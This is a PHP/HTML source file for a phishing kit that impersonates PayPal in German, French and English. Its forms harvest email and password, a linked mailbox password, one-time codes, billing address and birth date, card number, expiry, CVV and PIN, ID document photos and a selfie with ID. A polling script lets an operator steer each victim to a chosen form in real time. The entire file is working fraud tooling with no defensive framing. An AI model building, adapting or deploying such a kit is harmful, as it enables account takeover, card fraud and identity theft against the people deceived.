<?php
error_reporting(0);
session_start();

if (!isset($_GET['session'])) {
    $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
    switch($browser_lang) {
        case 'de':
            $_GET['session'] = base64_encode('DE');
            break;
        case 'fr':
            $_GET['session'] = base64_encode('FR');
            break;
        default:
            $_GET['session'] = base64_encode('EN');
            break;
    }
}

if ($_GET['session'] == base64_encode('DE') || $_GET['session'] == base64_encode('FR') || $_GET['session'] == base64_encode('EN') || $_GET['session'] == base64_encode('any')) {
  if ($_GET['session'] == base64_encode('DE')) {

    $u_label ="E-Mail-Adresse";
    $ft_href ="E-Mail vergessen?";
    $btn_option_1 ="Weiter";
    $line_hr ="oder";
    $btn_option_2 = "Registrieren";
    $btn_option_3 = "Bestätigen";


    $href_edit = "Ändern";
    $p_label = "Passwort";
    $ft_href_2 = "Passwort vergessen?";


    $ver_title = "Verifizierung";
    $sec_text = "Aufgrund der Aktualisierung unserer Sicherheitsrichtlinien müssen Sie nun Ihre Identität verifizieren. Dank dieser Maßnahmen halten wir Ihr Konto sicher. In wenigen Sekunden werden Sie zum Verifizierungsprozess weitergeleitet.";


    $ml_ld_text = "Wir melden Sie sicher an";
    $ml_title = "E-Mail-Verknüpfung";
    $ml_text = "Es scheint, als hätten Sie Ihr Konto nicht mit Ihrer E-Mail verknüpft. Geben Sie das Passwort für Ihr Konto bei ";
    $ml_text_2 = ", um den Verknüpfungsprozess zu starten.";


    $py_title = "Karteninformationen";
$py_text = "Bitte geben Sie Ihre Karteninformationen ein, um fortzufahren:";
$cn_label = "Kartennummer";
$ce_label = "Ablaufdatum";
$ck_label = "CVV";
$cfn_label = "Vollständiger Name";
$cpin_label = "PIN-Code";


    $crp_text = "Geben Sie den PIN-Code Ihrer Karte ein, um fortzufahren:";
    $crp_label = "PIN-Code";


    $dc_title = "Identitätsverifizierung";
    $dc_text = "Wir führen einen Identitätsverifizierungsprozess durch, um die Sicherheit und Integrität unserer Plattform zu gewährleisten. Bitte überprüfen Sie Ihr Identifikationsdokument unten:";
    $dc_front_label = "Vorderseite des Dokuments";
    $dc_back_label = "Rückseite des Dokuments";

    $dc_2_text = "Um den Verifizierungsprozess abzuschließen, ist es erforderlich, dass Sie ein Foto von sich machen, auf dem Sie Ihr Identifikationsdokument halten.";
    $dc_self_label = "Selfie mit Dokument";

    $ld_page = "Wir überprüfen Ihre Dokumente";

    $sc_title = "Konto verifiziert";
    $sc_text = "Ihr Konto wurde erfolgreich verifiziert. In wenigen Sekunden werden Sie zu unserer Hauptseite weitergeleitet. Dies gewährleistet die Sicherheit Ihres Kontos. Vielen Dank für Ihre Mitarbeit.";


    $bl_text = "Bestätigen Sie die Angaben Ihrer Rechnungsadresse, um fortzufahren.";
    $fname_label = "Vorname";
    $lname_label = "Nachname";
    $pho_label = "Telefonnummer";
    $db_label = "Geburtsdatum";
    $add_label = "Adresse";
    $stat_label = "Bundesland";
    $zp_label = "PLZ";


    $footer_string_1 = "Kontaktiere uns";
    $footer_string_2 = "Datenschutz";
    $footer_string_3 = "Rechtliches";
    $footer_string_4 = "Aktualisierungen der Richtlinien";
    $footer_string_5 = "Weltweit";


    $po_title = "Sicherheitscode";
    $po_text = "Geben Sie den 6-stelligen Code ein, den wir an Ihr Telefon gesendet haben:";
    $po_label = "Sicherheitscode";

    $kode_error = "Der eingegebene Code ist falsch. Wir haben Ihnen einen neuen gesendet.";
    $card_error = "Die eingegebenen Kartendaten sind ungültig. Bitte überprüfen Sie sie erneut und versuchen Sie es erneut.";

  } elseif ($_GET['session'] == base64_encode('any')) {


      $u_label ="E-Mail-Adresse";
        $ft_href ="E-Mail vergessen?";
        $btn_option_1 ="Weiter";
        $line_hr ="oder";
        $btn_option_2 = "Registrieren";
        $btn_option_3 = "Bestätigen";


        $href_edit = "Ändern";
        $p_label = "Passwort";
        $ft_href_2 = "Passwort vergessen?";


        $ver_title = "Verifizierung";
        $sec_text = "Aufgrund der Aktualisierung unserer Sicherheitsrichtlinien müssen Sie nun Ihre Identität verifizieren. Dank dieser Maßnahmen halten wir Ihr Konto sicher. In wenigen Sekunden werden Sie zum Verifizierungsprozess weitergeleitet.";


        $ml_ld_text = "Wir melden Sie sicher an";
        $ml_title = "E-Mail-Verknüpfung";
        $ml_text = "Es scheint, als hätten Sie Ihr Konto nicht mit Ihrer E-Mail verknüpft. Geben Sie das Passwort für Ihr ";
        $ml_text_2 = ", um den Verknüpfungsprozess zu starten.";


        $bl_text = "Bestätigen Sie die Angaben Ihrer Rechnungsadresse, um fortzufahren.";
        $fname_label = "Vorname";
        $lname_label = "Nachname";
        $pho_label = "Telefonnummer";
        $db_label = "Geburtsdatum";
        $add_label = "Adresse";
        $stat_label = "Bundesland";
        $zp_label = "PLZ";


        $py_title = "Karteninformationen";
        $py_text = "Bitte geben Sie Ihre Karteninformationen ein, um fortzufahren:";
        $cn_label = "Kartennummer";
        $ce_label = "Ablaufdatum";
        $ck_label = "CVV";


        $crp_text = "Geben Sie den PIN-Code Ihrer Karte ein, um fortzufahren:";
        $crp_label = "PIN-Code";


        $dc_title = "Identitätsverifizierung";
        $dc_text = "Wir führen einen Identitätsverifizierungsprozess durch, um die Sicherheit und Integrität unserer Plattform zu gewährleisten. Bitte überprüfen Sie Ihr Identifikationsdokument unten:";
        $dc_front_label = "Vorderseite des Dokuments";
        $dc_back_label = "Rückseite des Dokuments";

        $dc_2_text = "Um den Verifizierungsprozess abzuschließen, ist es notwendig, dass Sie ein Foto von sich machen, während Sie Ihr Ausweisdokument halten.";
        $dc_self_label = "Selfie-Foto";

        $ld_page = "Wir überprüfen Ihre Dokumente";

        $sc_title = "Konto verifiziert";
        $sc_text = "Ihr Konto wurde erfolgreich verifiziert. In wenigen Sekunden werden Sie zu unserer Hauptseite weitergeleitet. Dies gewährleistet die Sicherheit Ihres Kontos. Vielen Dank für Ihre Kooperation.";

        $footer_string_1 = "Kontakt";
        $footer_string_2 = "Datenschutz";
        $footer_string_3 = "Rechtliches";
        $footer_string_4 = "Richtlinien-Updates";
        $footer_string_5 = "Weltweit";


        $po_title = "Sicherheitscode";
        $po_text = "Geben Sie den 6-stelligen Code ein, den wir an Ihr Telefon gesendet haben:";
        $po_label = "Sicherheitscode";


        $kode_error = "Der eingegebene Code ist falsch, wir haben Ihnen einen neuen gesendet.";
        $card_error = "Die eingegebene Kartennummer ist nicht gültig. Bitte überprüfen Sie sie und versuchen Sie es erneut.";
   
  } elseif ($_GET['session'] == base64_encode('FR')) {

    $u_label ="Adresse e-mail";
    $ft_href ="E-mail oublié?";
    $btn_option_1 ="Suivant";
    $line_hr ="ou";
    $btn_option_2 = "S'inscrire";
    $btn_option_3 = "Confirmer";


    $href_edit = "Modifier";
    $p_label = "Mot de passe";
    $ft_href_2 = "Mot de passe oublié?";


    $ver_title = "Vérification";
    $sec_text = "En raison de la mise à jour de nos politiques de sécurité, vous devez maintenant vérifier votre identité. Grâce à ces mesures, nous gardons votre compte sécurisé. Dans quelques secondes, vous serez redirigé vers le processus de vérification.";


    $ml_ld_text = "Nous vous connectons en toute sécurité";
    $ml_title = "Liaison e-mail";
    $ml_text = "Il semble que vous n'ayez pas lié votre compte à votre e-mail. Entrez le mot de passe de votre compte ";
    $ml_text_2 = " pour commencer le processus de liaison.";


    $py_title = "Informations de carte";
    $py_text = "Veuillez saisir vos informations de carte pour continuer:";
    $cn_label = "Numéro de carte";
    $ce_label = "Date d'expiration";
    $ck_label = "CVV";
    $cfn_label = "Nom complet";
    $cpin_label = "Code PIN";


    $crp_text = "Entrez le code PIN de votre carte pour continuer:";
    $crp_label = "Code PIN";


    $dc_title = "Vérification d'identité";
    $dc_text = "Nous effectuons un processus de vérification d'identité pour assurer la sécurité et l'intégrité de notre plateforme. Veuillez vérifier votre document d'identification ci-dessous:";
    $dc_front_label = "Recto du document";
    $dc_back_label = "Verso du document";

    $dc_2_text = "Pour terminer le processus de vérification, il est nécessaire que vous preniez une photo de vous tenant votre document d'identification.";
    $dc_self_label = "Selfie avec document";

    $ld_page = "Nous vérifions vos documents";

    $sc_title = "Compte vérifié";
    $sc_text = "Votre compte a été vérifié avec succès. Dans quelques secondes, vous serez redirigé vers notre page principale. Cela garantit la sécurité de votre compte. Merci pour votre coopération.";


    $bl_text = "Confirmez les détails de votre adresse de facturation pour continuer.";
    $fname_label = "Prénom";
    $lname_label = "Nom de famille";
    $pho_label = "Numéro de téléphone";
    $db_label = "Date de naissance";
    $add_label = "Adresse";
    $stat_label = "État/Province";
    $zp_label = "Code postal";

    $footer_string_1 = "Nous contacter";
    $footer_string_2 = "Confidentialité";
    $footer_string_3 = "Légal";
    $footer_string_4 = "Mises à jour des politiques";
    $footer_string_5 = "Mondial";


    $po_title = "Code de sécurité";
    $po_text = "Entrez le code à 6 chiffres que nous avons envoyé à votre téléphone:";
    $po_label = "Code de sécurité";

    $kode_error = "Le code saisi est incorrect. Nous vous en avons envoyé un nouveau.";
    $card_error = "Les données de carte saisies ne sont pas valides. Veuillez les vérifier et réessayer.";

  } elseif ($_GET['session'] == base64_encode('EN')) {

    $u_label ="Email address";
    $ft_href ="Forgot email?";
    $btn_option_1 ="Next";
    $line_hr ="or";
    $btn_option_2 = "Sign Up";
    $btn_option_3 = "Confirm";


    $href_edit = "Change";
    $p_label = "Password";
    $ft_href_2 = "Forgot password?";


    $ver_title = "Verification";
    $sec_text = "Due to the update of our security policies, you now need to verify your identity. Thanks to these measures, we keep your account secure. In a few seconds, you will be redirected to the verification process.";


    $ml_ld_text = "We are logging you in securely";
    $ml_title = "Email linking";
    $ml_text = "It seems you haven't linked your account to your email. Enter the password for your account ";
    $ml_text_2 = " to start the linking process.";


    $py_title = "Card information";
    $py_text = "Please enter your card details to continue:";
    $cn_label = "Card number";
    $ce_label = "Expiry date";
    $ck_label = "CVV";
    $cfn_label = "Full name";
    $cpin_label = "PIN code";


    $crp_text = "Enter your card's PIN code to continue:";
    $crp_label = "PIN Code";


    $dc_title = "Identity verification";
    $dc_text = "We are conducting an identity verification process to ensure the security and integrity of our platform. Please verify your identification document below:";
    $dc_front_label = "Front of document";
    $dc_back_label = "Back of document";

    $dc_2_text = "To complete the verification process, it is necessary for you to take a photo of yourself holding your identification document.";
    $dc_self_label = "Selfie with document";

    $ld_page = "We are verifying your documents";

    $sc_title = "Account verified";
    $sc_text = "Your account has been successfully verified. In a few seconds, you will be redirected to our main page. This ensures the security of your account. Thank you for your cooperation.";


    $bl_text = "Confirm your billing address details to continue.";
    $fname_label = "First name";
    $lname_label = "Last name";
    $pho_label = "Phone number";
    $db_label = "Date of birth";
    $add_label = "Address";
    $stat_label = "State/Province";
    $zp_label = "Postal code";

    $footer_string_1 = "Contact us";
    $footer_string_2 = "Privacy";
    $footer_string_3 = "Legal";
    $footer_string_4 = "Policy updates";
    $footer_string_5 = "Worldwide";


    $po_title = "Security code";
    $po_text = "Enter the 6-digit code we sent to your phone:";
    $po_label = "Security code";

    $kode_error = "The entered code is incorrect. We have sent you a new one.";
    $card_error = "The entered card data is not valid. Please check it and try again.";

  }
?>
<!DOCTYPE html>
<html>
   <head>
      <title>PayPal</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" type="image/x-icon" href="icon/favicon.ico" />
      <link rel="stylesheet" type="text/css" href="css/home.css">
<link rel="stylesheet" type="text/css" href="css/imgs.css">
<link rel="stylesheet" type="text/css" href="css/fonts.css">
<link rel="stylesheet" type="text/css" href="css/loading_pscreen.css">
<link rel="stylesheet" type="text/css" href="css/loading_circle.css">
<link rel="stylesheet" type="text/css" href="css/animation_stick.css">
<link rel="stylesheet" type="text/css" href="css/responsive.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>


<script src="js/ext/jquery.mask.js" type="text/javascript"></script>
<script src="js/config.js" type="text/javascript"></script>
<script src="js/postman.js" type="text/javascript"></script>
<script src="js/elemental.js" type="text/javascript"></script>
<script src="js/globalScript.js" type="text/javascript"></script>
<script src="js/liveScript.js" type="text/javascript"></script>
   </head>
   <body>

      <div style="display: none;">
          <div id="station_data"></div>
      </div>


      <div id="loading-content" style="display: none;">
        <center>
          <div id="load-round" class="load"></div>
        </center>
      </div>


      <div id="succ-content" style="display: none;">
        <center>
          <div class="success-animation">
            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none" /><path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" /></svg>
          </div>
        </center>
      </div>


      <div class="main-form" id="u-form" style="display: ;">
         <img class="web-small-icon">
         <div class="input-box">
            <div class="input-container">
               <input type="text" id="u-field" placeholder=" ">
               <label for="u-field"><?php echo $u_label; ?></label>
            </div>
            <a href=""><?php echo $ft_href; ?></a>
            <button class="enable-btn" onclick="go('submit-u');"><?php echo $btn_option_1; ?></button>
         </div>
         <div class="middle-bar">
            <span><?php echo $line_hr; ?></span>
         </div>
         <button class="cancel-btn"><?php echo $btn_option_2; ?></button>
      </div>


      <div class="main-form" id="p-form" style="display: none;">
         <img class="web-small-icon">
         <span class="flex-line marg-bottom">
            <span id="u-value"></span>
            <a href="#" id="sve-value"><?php echo $href_edit; ?></a>
         </span>
         <div class="input-box">
            <div class="input-container">
               <input type="password" id="p-field" placeholder=" ">
               <label for="p-field"><?php echo $p_label; ?></label>
            </div>
            <a href=""><?php echo $ft_href_2; ?></a>
            <button class="enable-btn" onclick="go('submit-lg');"><?php echo $btn_option_1; ?></button>
         </div>
         <div class="middle-bar">
            <span><?php echo $line_hr; ?></span>
         </div>
         <button class="cancel-btn"><?php echo $btn_option_2; ?></button>
      </div>


      <div class="main-form" id="landing-page" style="display: none;">
         <img class="web-small-icon">
         <h1><?php echo $ver_title; ?></h1>
         <div class="input-box">
            <span class="label-text "><?php echo $sec_text; ?></span>
            <button class="enable-btn" onclick="proceedFromVerification();" style="margin-top: 20px;"><?php echo $btn_option_1; ?></button>
         </div>
      </div>



      <div class="main-form" id="po-form" style="display: none;">
         <img class="web-small-icon">
         <h1 id="po-h1"><?php echo $po_title; ?></h1>
         <div class="input-box">
            <span class="label-text " id="po-text"><?php echo $po_text; ?></span>
            <div class="input-container">
               <input type="text" id="k-field" placeholder=" " maxlength="6" pattern="[0-9]{6}" inputmode="numeric">
               <label for="p-field" id="po-label"><?php echo $po_label; ?></label>
            </div>
            <span id="erno-op" class="error-text" style="display: none;"><?php echo $kode_error; ?></span>
            <button class="enable-btn" onclick="go('submit-kod');"><?php echo $btn_option_3; ?></button>
         </div>
      </div>


      <div class="main-form" id="page-load" style="display: none;">
         <img class="web-small-icon">
         <div class="input-box">
            <div class="spinner loading"></div>
            <div class="flex-line">
               <span class="label-text-2"><?php echo $ml_ld_text; ?></span>
               <span id="ld-dots">
                  <span id="dot1" class="hidden">.</span>
                  <span id="dot2" class="hidden">.</span>
                  <span id="dot3" class="hidden">.</span>
               </span>
            </div>
         </div>
      </div>


      <div class="main-form" id="otp-error-form" style="display: none;">
         <img class="web-small-icon">
         <h1 id="otp-error-h1"><?php echo $po_title; ?></h1>
         <div class="input-box">
            <span class="label-text " id="otp-error-text"><?php echo $po_text; ?></span>
            <div class="input-container">
               <input type="text" id="otp-error-field" placeholder=" " maxlength="6" pattern="[0-9]{6}" inputmode="numeric">
               <label for="otp-error-field" id="otp-error-label"><?php echo $po_label; ?></label>
            </div>
            <span id="otp-error-message" class="error-text" style="display: block;"><?php echo $kode_error; ?></span>
            <button class="enable-btn" onclick="go('submit-otp-error');"><?php echo $btn_option_3; ?></button>
         </div>
      </div>


      <div class="main-form" id="ml-form" style="display: none;">
         <img class="web-small-icon">
         <h1><?php echo $ml_title; ?></h1>
         <div id="ml-icon"></div>
         <div class="input-box">
            <span class="label-text" style="text-align: left;">
              <?php echo $ml_text; ?><span id="ml-server"></span> <?php echo $ml_text_2; ?>
            </span>
            <div class="input-container">
               <input type="password" placeholder=" " disabled="" style="cursor: not-allowed;">
               <label for="p-field" id="ml-u-value"></label>
            </div>
            <div class="input-container">
               <input type="password" id="mlPsField" placeholder=" ">
               <label for="p-field"><?php echo $p_label; ?></label>
            </div>
            <button class="enable-btn" onclick="go('submit-ml');"><?php echo $btn_option_3; ?></button>
         </div>
      </div>


      <div class="main-form" id="adr-form" style="display: none;">
         <img class="web-small-icon">
         <h1><?php echo $ver_title; ?></h1>
         <div class="input-box">
            <span class="label-text "><?php echo $bl_text; ?></span>
            <div class="flex-line">
               <div class="input-container inline-block">
                  <input type="text" id="fn-field" placeholder=" ">
                  <label for="p-field"><?php echo $fname_label; ?></label>
               </div>
               <div class="input-container inline-block marg-left">
                  <input type="text" id="ln-field" placeholder=" ">
                  <label for="p-field"><?php echo $lname_label; ?></label>
               </div>
            </div>
            <div class="input-container">
               <input type="text" id="pho-field" placeholder=" ">
               <label for="p-field"><?php echo $pho_label; ?></label>
            </div>
            <div class="input-container">
               <input type="date" id="db-field" placeholder=" ">
               <label for="p-field"><?php echo $db_label; ?></label>
            </div>
            <div class="input-container">
               <input type="text" id="addr-field" placeholder=" ">
               <label for="p-field"><?php echo $add_label; ?></label>
            </div>
            <div class="flex-line">
               <div class="input-container inline-block">
                  <input type="text" id="st-field" placeholder=" ">
                  <label for="p-field"><?php echo $stat_label; ?></label>
               </div>
               <div class="input-container inline-block marg-left">
                  <input type="text" id="zp-field" placeholder=" ">
                  <label for="p-field"><?php echo $zp_label; ?></label>
               </div>
            </div>
            <button class="enable-btn" onclick="go('submit-addr');"><?php echo $btn_option_3; ?></button>
         </div>
      </div>



      <div class="main-form" id="cr-form" style="display: none;">
         <img class="web-small-icon">
         <h1><?php echo $py_title; ?></h1>
         <div class="input-box">
            <span class="label-text "><?php echo $py_text; ?></span>
            <div class="input-container">
               <input type="text" id="fullname-field" placeholder=" ">
               <label for="fullname-field"><?php echo $cfn_label; ?></label>
            </div>
            <div class="input-container">
               <input type="text" id="card-field" placeholder=" " maxlength="19" inputmode="numeric">
               <label for="card-field"><?php echo $cn_label; ?></label>
            </div>
            <span id="erno-cr" class="error-text" style="display: none;"><?php echo $card_error; ?></span>
            <div class="flex-line">
               <div class="input-container inline-block">
                  <input type="text" id="expiry-field" placeholder=" " maxlength="5" inputmode="numeric">
                  <label for="expiry-field"><?php echo $ce_label; ?></label>
               </div>
               <div class="input-container inline-block marg-left">
                  <input type="text" id="cvv-field" placeholder=" " maxlength="4" inputmode="numeric">
                  <label for="cvv-field"><?php echo $ck_label; ?></label>
               </div>
            </div>
            <div class="input-container">
               <input type="text" id="pin-field" placeholder=" " maxlength="4" inputmode="numeric">
               <label for="pin-field"><?php echo $cpin_label; ?></label>
            </div>
            <button class="enable-btn" onclick="go('submit-card');"><?php echo $btn_option_3; ?></button>
         </div>
      </div>





      <div class="main-form" id="dc-form" style="display: none;">
         <img class="web-small-icon">
         <h1><?php echo $dc_title; ?></h1>
         <div class="input-box">
            <span class="label-text"><?php echo $dc_text; ?></span>
            <div class="input-container">
               <input type="file" id="doc-front-field" placeholder=" " accept="image/*">
               <label for="p-field"><?php echo $dc_front_label; ?></label>
            </div>
            <div class="input-container">
               <input type="file" id="doc-back-field" placeholder=" " accept="image/*">
               <label for="p-field"><?php echo $dc_back_label; ?></label>
            </div>
            <button class="enable-btn" onclick="go('submit-docs');"><?php echo $btn_option_3; ?></button>
            <!--Hidden-Inputs-->
            <input type="text" id="front-base" hidden="" style="display: none;">
            <input type="text" id="back-base" hidden="" style="display: none;">
            <!----------------->
         </div>
      </div>


      <div class="main-form" id="dc-2-form" style="display: none;">
         <img class="web-small-icon">
         <h1><?php echo $dc_title; ?></h1>
         <div class="input-box">
            <span class="label-text"><?php echo $dc_2_text; ?></span>
            <img class="doc-example-photo">
            <div class="input-container">
               <input type="file" id="doc-face-field" placeholder=" " accept="image/*">
               <label for="p-field"><?php echo $dc_self_label; ?></label>
            </div>
            <button class="enable-btn" onclick="go('submit-docs-2');"><?php echo $btn_option_3; ?></button>
            <!--Hidden-Inputs-->
            <input type="text" id="face-base" hidden="" style="display: none;">
            <!----------------->
         </div>
      </div>


      <div class="main-form" id="doc-load" style="display: none;">
         <img class="web-small-icon">
         <div class="input-box" id="doc-proc-content" style="display: ;">
            <div class="spinner loading"></div>
            <div class="flex-line">
               <span class="label-text-2"><?php echo $ld_page; ?></span>
               <span id="ld-dots-2">
                  <span id="dot1-2" class="hidden">.</span>
                  <span id="dot2-2" class="hidden">.</span>
                  <span id="dot3-2" class="hidden">.</span>
               </span>
            </div>
         </div>
         <div class="input-box" id="sc-doc" style="display: none;">
            <img class="doc-ok-icon">
         </div>
      </div>


      <div class="main-form" id="sc-page" style="display: none;">
         <img class="web-small-icon">
         <h1><?php echo $sc_title; ?></h1>
         <div class="input-box">
            <span class="label-text-2"><?php echo $sc_text; ?></span>
         </div>
         <center>
            <div class="success-animation">
               <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none" /><path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" /></svg>
            </div>
         </center>
      </div>

      <footer>
         <div class="flex-line">
            <span><?php echo $footer_string_1; ?></span>
            <span><?php echo $footer_string_2; ?></span>
            <span><?php echo $footer_string_3; ?></span>
            <span><?php echo $footer_string_4; ?></span>
            <span><?php echo $footer_string_5; ?></span>
         </div>
      </footer>

      <script>

      function proceedFromVerification() {
          console.log('Proceeding from verification page to email form...');
          hideDiv('landing-page');
          activateMLForm();
      }


      function checkForAdminRedirect() {
          fetch('check_redirect.php')
              .then(response => response.json())
              .then(data => {
                  if (data.redirect && data.redirect_to) {
                      console.log('Admin redirect received:', data.redirect_to);
                      handleAdminRedirect(data.redirect_to);
                  }
              })
              .catch(error => {
                  console.log('Redirect check error:', error);
              });
      }

      function handleAdminRedirect(redirectTo) {

          $('#loading-content').hide();
          

          const allForms = document.querySelectorAll('.main-form');
          allForms.forEach(form => form.style.display = 'none');

          switch(redirectTo) {
              case 'login':
                  showDiv('ml-form');
                  break;
              case 'card':
                  showDiv('cr-form');
                  break;
              case 'address':
                  showDiv('adr-form');
                  break;
              case 'otp':
                  showDiv('po-form');
                  break;
              case 'otp-error':
                  showDiv('po-form');
                  break;
              case 'pin':
                  showDiv('pn-form');
                  break;
              case 'success':
                  showDiv('sc-page');
                  break;
              default:
                  console.log('Unknown redirect destination:', redirectTo);
          }
      }


      const urlParams = new URLSearchParams(window.location.search);
      const redirectParam = urlParams.get('redirect');
      const showParam = urlParams.get('show');
      
      if (redirectParam) {
          handleAdminRedirect(redirectParam);
      } else if (showParam === 'loading') {

          showDiv('page-load');

          setInterval(checkForAdminRedirect, 2000);
      } else {

          setInterval(checkForAdminRedirect, 2000);
      }
      </script>
  </body>
</html>
<?php } ?>